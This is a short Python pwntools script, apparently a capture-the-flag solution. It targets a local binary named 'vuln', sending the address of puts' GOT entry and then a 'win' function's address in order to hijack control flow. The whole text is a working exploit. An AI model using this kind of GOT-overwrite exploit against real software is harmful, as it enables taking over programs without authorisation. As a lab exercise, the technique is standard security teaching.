from pwn import *
from struct import pack

context.log_level = 'debug'
p = process('./vuln')

exitgot = p.elf.symbols['got.puts']
winfunc = p.elf.symbols['win']

p.recvline()
p.recvline()

p.sendline(pack("<i", exitgot))
p.recvline()

p.sendline(pack("<i", winfunc))
p.recvline()
